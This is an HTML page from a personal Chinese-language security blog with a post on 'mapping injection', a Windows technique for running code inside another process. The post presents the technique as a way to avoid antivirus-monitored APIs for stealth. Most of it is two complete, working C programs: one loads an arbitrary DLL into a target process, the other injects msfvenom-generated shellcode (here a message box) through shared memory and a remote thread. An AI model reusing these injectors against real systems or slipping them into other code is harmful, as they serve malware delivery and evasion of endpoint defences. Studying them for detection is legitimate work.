@@ -1,0 +1,196 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>Hexo | Hexo</title><meta name="author" content="John Doe"><meta name="copyright" content="John Doe"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="映射注入1.为什么用映射注入？在映射注入中，目标进程中的远程线程会执行当前进程在内存中映射的地址。通过这种映射的方式，我们不必使用VirtualAllocEx,WriteProcessMemory等等被杀毒软件严密监视的API函数，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典的写入函数，增加了隐蔽性。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Hexo">
+<meta property="og:url" content="https://e1ectr0nlc.github.io/2023/07/24/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="映射注入1.为什么用映射注入？在映射注入中，目标进程中的远程线程会执行当前进程在内存中映射的地址。通过这种映射的方式，我们不必使用VirtualAllocEx,WriteProcessMemory等等被杀毒软件严密监视的API函数，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典的写入函数，增加了隐蔽性。">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-07-24T09:38:28.729Z">
+<meta property="article:modified_time" content="2023-07-24T12:32:21.733Z">
+<meta property="article:author" content="John Doe">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://e1ectr0nlc.github.io/2023/07/24/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: 'Copy successfully',
+    error: 'Copy error',
+    noSupport: 'The browser does not support'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'Hexo',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-07-24 20:32:21'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">9</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">1</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><hr class="custom-hr"/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Hexo"><span class="site-name">Hexo</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">No title</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2023-07-24T09:38:28.729Z" title="Created 2023-07-24 17:38:28">2023-07-24</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2023-07-24T12:32:21.733Z" title="Updated 2023-07-24 20:32:21">2023-07-24</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post View:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="映射注入"><a href="#映射注入" class="headerlink" title="映射注入"></a>映射注入</h1><h2 id="1-为什么用映射注入？"><a href="#1-为什么用映射注入？" class="headerlink" title="1.为什么用映射注入？"></a>1.为什么用映射注入？</h2><p>在映射注入中，目标进程中的远程线程会执行当前进程在内存中映射的地址。通过这种映射的方式，我们不必使用<code>VirtualAllocEx</code>,<code>WriteProcessMemory</code>等等被杀毒软件严密监视的API函数，同时创建Mapping对象本质上属于申请一块物理内存，而申请的物理内存又能比较方便的通过系统函数直接映射到进程的虚拟内存里，这也就避免使用经典的写入函数，增加了隐蔽性。</p>
+<h2 id="2-映射注入的原理"><a href="#2-映射注入的原理" class="headerlink" title="2.映射注入的原理"></a>2.映射注入的原理</h2><p>在Windows操作系统中，所有进程共享一个虚拟地址空间，这意味着同一个物理地址可以被多个进程映射到不同的虚拟地址上。我们只需要将我们的dll或者shellcode映射到当前进程，再通过<code>MapViewOfFile2</code>API映射到目标进程，创建远程线程去执行我们映射到目标进程的dll或者shellcode就完成了注入。</p>
+<p>总结一下分为以下几步：</p>
+<ul>
+<li>在当前进程创建mapping对象</li>
+<li>为创建的mapping对象映射到虚拟地址</li>
+<li>将dll或者shellcode写入映射的虚拟地址</li>
+<li>打开目标进程句柄</li>
+<li>将mapping对象映射到目标进程的虚拟地址</li>
+<li>创建远程线程，回调函数地址改为mapping对象的虚拟地址</li>
+</ul>
+<h3 id="关键函数"><a href="#关键函数" class="headerlink" title="关键函数"></a>关键函数</h3><p><code>CreateFileMapping</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">HANDLE <span class="title function_">CreateFileMapping</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           HANDLE                hFile,</span></span><br><span class="line"><span class="params">  [in, optional] LPSECURITY_ATTRIBUTES lpFileMappingAttributes,</span></span><br><span class="line"><span class="params">  [in]           DWORD                 flProtect,</span></span><br><span class="line"><span class="params">  [in]           DWORD                 dwMaximumSizeHigh,</span></span><br><span class="line"><span class="params">  [in]           DWORD                 dwMaximumSizeLow,</span></span><br><span class="line"><span class="params">  [in, optional] LPCSTR                lpName</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>MapViewOfFile</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">LPVOID <span class="title function_">MapViewOfFile</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in] HANDLE hFileMappingObject,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwDesiredAccess,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFileOffsetHigh,</span></span><br><span class="line"><span class="params">  [in] DWORD  dwFileOffsetLow,</span></span><br><span class="line"><span class="params">  [in] SIZE_T dwNumberOfBytesToMap</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+<p><code>MapViewOfFile2</code></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">PVOID <span class="title function_">MapViewOfFile2</span><span class="params">(</span></span><br><span class="line"><span class="params">  [in]           HANDLE  FileMappingHandle,</span></span><br><span class="line"><span class="params">  [in]           HANDLE  ProcessHandle,</span></span><br><span class="line"><span class="params">  [in]           ULONG64 Offset,</span></span><br><span class="line"><span class="params">  [in, optional] PVOID   BaseAddress,</span></span><br><span class="line"><span class="params">  [in]           SIZE_T  ViewSize,</span></span><br><span class="line"><span class="params">  [in]           ULONG   AllocationType,</span></span><br><span class="line"><span class="params">  [in]           ULONG   PageProtection</span></span><br><span class="line"><span class="params">)</span>;</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="3-代码实现"><a href="#3-代码实现" class="headerlink" title="3.代码实现"></a>3.代码实现</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment(lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="type">const</span> <span class="type">char</span>* dllPath = <span class="string">&quot;F:\\code_py&amp;C\\vs2017\\injecte\\Dll1\\Debug\\Dll1.dll&quot;</span>;</span><br><span class="line"></span><br><span class="line">DWORD pid = <span class="number">20208</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="comment">// 打开目标程序</span></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line">	<span class="keyword">if</span> (!hProcess)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to open the target process. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//创建dll路径映射对象</span></span><br><span class="line">	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_READWRITE, <span class="number">0</span>, <span class="built_in">strlen</span>(dllPath) + <span class="number">1</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hMapping)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to create file mapping. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将文件映射到当前进程</span></span><br><span class="line">	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="built_in">strlen</span>(dllPath) + <span class="number">1</span>);</span><br><span class="line">	<span class="keyword">if</span> (!lpMapAddress)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to map view of file in the current process. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将dll路径写入映射内存</span></span><br><span class="line">	<span class="built_in">strcpy</span>((<span class="type">char</span>*)lpMapAddress, dllPath);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 目标进程中获取loadlibrary的路径</span></span><br><span class="line">	LPVOID pLoadLibraryA = (LPVOID)GetProcAddress(GetModuleHandle(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span> (!pLoadLibraryA)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to get the address of LoadLibraryA. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		UnmapViewOfFile(lpMapAddress);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 将文件映射映射到远程进程</span></span><br><span class="line">	LPVOID lpRemoteMapAddress = MapViewOfFile2(hMapping, hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_READWRITE);</span><br><span class="line">	<span class="keyword">if</span> (!lpRemoteMapAddress)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to map view of file in the target process. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		UnmapViewOfFile(lpMapAddress);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 创建远程线程调用loadlibrary函数去加载dll</span></span><br><span class="line">	HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)pLoadLibraryA, lpRemoteMapAddress, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line">	<span class="keyword">if</span> (!hRemoteThread)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;Failed to create a remote thread in the target process. Error code: %d\n&quot;</span>, GetLastError());</span><br><span class="line">		UnmapViewOfFile(lpRemoteMapAddress);</span><br><span class="line">		UnmapViewOfFile(lpMapAddress);</span><br><span class="line">		CloseHandle(hMapping);</span><br><span class="line">		CloseHandle(hProcess);</span><br><span class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// 等待线程运行结束</span></span><br><span class="line">	WaitForSingleObject(hRemoteThread, INFINITE);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// Cleanup</span></span><br><span class="line">	CloseHandle(hRemoteThread);</span><br><span class="line">	UnmapViewOfFile(lpRemoteMapAddress);</span><br><span class="line">	UnmapViewOfFile(lpMapAddress);</span><br><span class="line">	CloseHandle(hMapping);</span><br><span class="line">	CloseHandle(hProcess);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>或者使用shellcode进行注入</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> comment (lib, <span class="string">&quot;OneCore.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//msfvenom -p windows/x64/messagebox -e x64/xor_dynamic -i 15 EXITFUNC=thread  -f c</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> shellcode[] =</span><br><span class="line"><span class="string">&quot;\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xd0\x00\x00\x00\x41\x51&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x3e\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x8b\x52\x18\x3e\x48\x8b\x52\x20\x3e\x48\x8b\x72\x50\x3e\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02&quot;</span></span><br><span class="line"><span class="string">&quot;\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x48\x8b\x52\x20\x3e\x8b\x42\x3c\x48\x01\xd0\x3e\x8b\x80\x88&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x48\x85\xc0\x74\x6f\x48\x01\xd0\x50\x3e\x8b\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x18\x3e\x44\x8b\x40\x20\x49\x01\xd0\xe3\x5c\x48\xff\xc9\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x3e\x4c\x03\x4c\x24&quot;</span></span><br><span class="line"><span class="string">&quot;\x08\x45\x39\xd1\x75\xd6\x58\x3e\x44\x8b\x40\x24\x49\x01\xd0&quot;</span></span><br><span class="line"><span class="string">&quot;\x66\x3e\x41\x8b\x0c\x48\x3e\x44\x8b\x40\x1c\x49\x01\xd0\x3e&quot;</span></span><br><span class="line"><span class="string">&quot;\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41&quot;</span></span><br><span class="line"><span class="string">&quot;\x59\x5a\x3e\x48\x8b\x12\xe9\x49\xff\xff\xff\x5d\x49\xc7\xc1&quot;</span></span><br><span class="line"><span class="string">&quot;\x00\x00\x00\x00\x3e\x48\x8d\x95\x1a\x01\x00\x00\x3e\x4c\x8d&quot;</span></span><br><span class="line"><span class="string">&quot;\x85\x2b\x01\x00\x00\x48\x31\xc9\x41\xba\x45\x83\x56\x07\xff&quot;</span></span><br><span class="line"><span class="string">&quot;\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff\xd5\x48&quot;</span></span><br><span class="line"><span class="string">&quot;\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47\x13&quot;</span></span><br><span class="line"><span class="string">&quot;\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x48\x65\x6c\x6c\x6f&quot;</span></span><br><span class="line"><span class="string">&quot;\x2c\x20\x66\x72\x6f\x6d\x20\x4d\x53\x46\x21\x00\x4d\x65\x73&quot;</span></span><br><span class="line"><span class="string">&quot;\x73\x61\x67\x65\x42\x6f\x78\x00&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">char</span>** argv)</span></span><br><span class="line">&#123;</span><br><span class="line">	DWORD pid = <span class="number">3908</span>;</span><br><span class="line"></span><br><span class="line">	HANDLE hMapping = CreateFileMapping(INVALID_HANDLE_VALUE, <span class="literal">NULL</span>, PAGE_EXECUTE_READWRITE, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode), <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	LPVOID lpMapAddress = MapViewOfFile(hMapping, FILE_MAP_WRITE, <span class="number">0</span>, <span class="number">0</span>, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">	<span class="built_in">memcpy</span>((PVOID)lpMapAddress, shellcode, <span class="keyword">sizeof</span>(shellcode));</span><br><span class="line"></span><br><span class="line">	HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);</span><br><span class="line"></span><br><span class="line">	LPVOID lpMapAddressRemote = MapViewOfFile2(hMapping, hProcess, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="number">0</span>, PAGE_EXECUTE_READ);</span><br><span class="line"></span><br><span class="line">	HANDLE hRemoteThread = CreateRemoteThread(hProcess, <span class="literal">NULL</span>, <span class="number">0</span>, (LPTHREAD_START_ROUTINE)lpMapAddressRemote, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">	UnmapViewOfFile(lpMapAddress);</span><br><span class="line">	CloseHandle(hMapping);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>此段代码来自<a target="_blank" rel="noopener" href="https://idiotc4t.com/code-and-dll-process-injection/mapping-injection#dai-ma-shi-xian">idiotc4t‘s blog</a></p>
+<p>运行结果：</p>
+<p><img src="C:\Users\zzy\AppData\Roaming\Typora\typora-user-images\image-20230724202825834.png" alt="image-20230724202825834"></p>
+<p>shellcode运行结果：</p>
+<p><img src="C:\Users\zzy\AppData\Roaming\Typora\typora-user-images\image-20230724203206403.png" alt="image-20230724203206403"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">Author: </span><span class="post-copyright-info"><a href="https://e1ectr0nlc.github.io">John Doe</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">Link: </span><span class="post-copyright-info"><a href="https://e1ectr0nlc.github.io/2023/07/24/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/">https://e1ectr0nlc.github.io/2023/07/24/%E6%98%A0%E5%B0%84%E6%B3%A8%E5%85%A5/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">Copyright Notice: </span><span class="post-copyright-info">All articles in this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless stating additionally.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/09/05/web%E6%BC%8F%E6%B4%9E%E5%B0%8F%E7%BB%93/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Previous Post</div><div class="prev_info"></div></div></a></div><div class="next-post pull-right"><a href="/2023/07/21/%E6%B3%A8%E5%86%8C%E8%A1%A8%E6%B3%A8%E5%85%A5/" title=""><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">Next Post</div><div class="next_info"></div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img 